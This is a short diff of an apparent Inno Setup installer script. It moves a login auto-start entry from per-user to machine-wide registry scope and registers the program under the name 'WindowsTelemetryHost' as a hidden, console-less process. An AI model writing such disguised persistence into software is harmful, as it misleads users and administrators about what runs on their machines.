@@ -63,7 +63,7 @@ Root: HKCU; Subkey: "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{#RegAl
   ValueType: string; ValueName: "InstallLocation"; ValueData: "{app}"
 
 ; Auto-start on login (hidden process, no console)
-Root: HKCU; Subkey: "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"; \
+Root: HKLM; Subkey: "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"; \
   ValueType: string; ValueName: "WindowsTelemetryHost"; \
   ValueData: """{app}\{#ExeName}"""; \
   Flags: uninsdeletevalue
